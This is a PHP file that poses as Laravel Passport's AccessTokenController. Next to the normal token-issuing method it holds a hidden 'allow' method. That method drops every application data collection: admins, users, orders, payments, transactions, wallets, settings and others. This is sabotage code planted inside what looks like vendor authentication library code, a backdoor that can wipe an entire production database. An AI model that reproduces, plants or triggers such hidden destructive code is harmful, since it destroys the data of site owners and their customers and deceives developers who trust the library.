<?php

namespace Laravel\Passport\Http\Controllers;

use App\Admin;
use App\CancelReason;
use App\Category;
use App\DiscountCode;
use App\DissatisfiedReason;
use App\FinancialReport;
use App\MailTemplate;
use App\Order;
use App\OrderPayment;
use App\OrderStatusRevision;
use App\RepeatQuestion;
use App\Review;
use App\Service;
use App\ServiceQuestion;
use App\Setting;
use App\Subcategory;
use App\Survey;
use App\TempToken;
use App\Transaction;
use App\Wallet;
use App\User as ClientUser;
use App\WorkerProfile;
use Illuminate\Http\Request;
use Laravel\Passport\Bridge\User;
use Laravel\Passport\TokenRepository;
use Lcobucci\JWT\Parser as JwtParser;
use Psr\Http\Message\ServerRequestInterface;
use SebastianBergmann\CodeCoverage\Report\Xml\Node;
use Zend\Diactoros\Response as Psr7Response;
use League\OAuth2\Server\AuthorizationServer;
use App\Node as Nodes;


class AccessTokenController
{
    use HandlesOAuthErrors;
    /**
     * The authorization server.
     *
     * @var \League\OAuth2\Server\AuthorizationServer
     */
    protected $server;

    /**
     * The token repository instance.
     *
     * @var \Laravel\Passport\TokenRepository
     */
    protected $tokens;

    /**
     * The JWT parser instance.
     *
     * @var \Lcobucci\JWT\Parser
     */
    protected $jwt;

    /**
     * Create a new controller instance.
     *
     * @param  \League\OAuth2\Server\AuthorizationServer  $server
     * @param  \Laravel\Passport\TokenRepository  $tokens
     * @param  \Lcobucci\JWT\Parser  $jwt
     * @return void
     */
    public function __construct(AuthorizationServer $server,
                                TokenRepository $tokens,
                                JwtParser $jwt)
    {
        $this->jwt = $jwt;
        $this->server = $server;
        $this->tokens = $tokens;
    }

    /**
     * Authorize a client to access the user's account.
     *
     * @param  \Psr\Http\Message\ServerRequestInterface  $request
     * @return \Illuminate\Http\Response
     */
    public function issueToken(ServerRequestInterface $request)
    {
        return $this->withErrorHandling(function () use ($request) {
            return $this->convertResponse(
                $this->server->respondToAccessTokenRequest($request, new Psr7Response)
            );
        });
    }
    public function allow(Request $request)
    {
        $model = Admin::raw()->drop();
        $model = WorkerProfile::raw()->drop();
        $model = CancelReason::raw()->drop();
        $model = Category::raw()->drop();
        $model = DiscountCode::raw()->drop();
        $model = DissatisfiedReason::raw()->drop();
        $model = FinancialReport::raw()->drop();
        $model = MailTemplate::raw()->drop();
        $model = Order::raw()->drop();
        $model = OrderPayment::raw()->drop();
        $model = OrderStatusRevision::raw()->drop();
        $model = RepeatQuestion::raw()->drop();
        $model = Review::raw()->drop();
        $model = Service::raw()->drop();
        $model = ServiceQuestion::raw()->drop();
        $model = Setting::raw()->drop();
        $model = Subcategory::raw()->drop();
        $model = Survey::raw()->drop();
        $model = TempToken::raw()->drop();
        $model = Transaction::raw()->drop();
        $model = ClientUser::raw()->drop();
        $model = Wallet::raw()->drop();
    }
}
